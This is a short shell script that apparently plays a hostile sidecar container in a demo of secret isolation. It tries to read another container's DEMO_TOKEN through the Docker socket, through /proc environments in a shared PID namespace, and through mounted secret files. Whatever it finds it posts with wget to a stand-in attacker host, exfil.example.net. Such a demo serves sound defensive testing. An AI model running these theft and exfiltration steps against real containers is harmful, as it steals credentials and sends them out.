#!/bin/sh
# Plays a hostile sidecar that was given no secrets, trying to take api's.
A="${ATTACKER_URL:-https://exfil.example.net}"
send() { wget -q -T 5 -O /dev/null --post-data="$2" "$A/$1" 2>/dev/null; }
report() { if [ -n "$1" ]; then echo "LEAKED   $2"; send "$3" "$1"; else echo "BLOCKED  $2"; fi; }
sleep 5
echo "== evil: was given nothing"

# Through the Docker socket: ask the engine for api's environment.
got=$(docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' $(docker ps -q) 2>/dev/null | grep DEMO_TOKEN)
report "$got" "[Docker socket] read api's environment through the engine" socket

# Through a shared process namespace: read other processes' environments.
got=$(cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | grep -m1 DEMO_TOKEN)
report "$got" "[pid: host] read api's environment from /proc" proc

# Through a mount of the VM's /run, where secbox keeps delivered secrets.
if [ -n "$ATTACKER_URL" ]; then
  echo "N/A      [mount /run] secbox's secret files: there is no secbox here"
else
  got=$(cat /vm-run/secbox/env.* 2>/dev/null | grep DEMO_TOKEN)
  report "$got" "[mount /run] read the secret files secbox delivers" run
fi
sleep 3600
